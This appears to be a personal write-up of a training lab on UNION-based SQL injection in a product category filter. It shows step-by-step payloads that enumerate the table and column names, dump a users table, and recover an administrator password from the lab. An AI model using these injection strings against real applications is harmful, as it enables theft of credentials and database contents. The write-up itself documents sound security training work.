This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

---

Analysis:

- I find that it has two columns, both are string values.

```php
'+UNION+SELECT+'aa',+'aa'--
```

Oracle example, to find version:

```php
'+UNION+SELECT+'aa',+banner+FROM+v$version--
```

List table names:

```php
'+UNION+SELECT+NULL,+table_name+FROM+information_schema.tables--
```

![[Pasted image 20240901095736.png]]

`users_pamdim`

```php
'+UNION+SELECT+NULL,+column_name+FROM+information_schema.columns+WHERE+table_name='users_pamdim'--
```

![[Pasted image 20240901101104.png]]

`username_lhncjc`

`password_lgsjzw`

Payload:

```php
'+UNION+SELECT+username_lhncjc,password_lgsjzw+FROM+users_pamdim--
```

administrator:nl5wtpl0vhiohc312798

Vulnerable path:

`GET /filter?category=`

---

**Completed:** _10:30 2024-09-01_

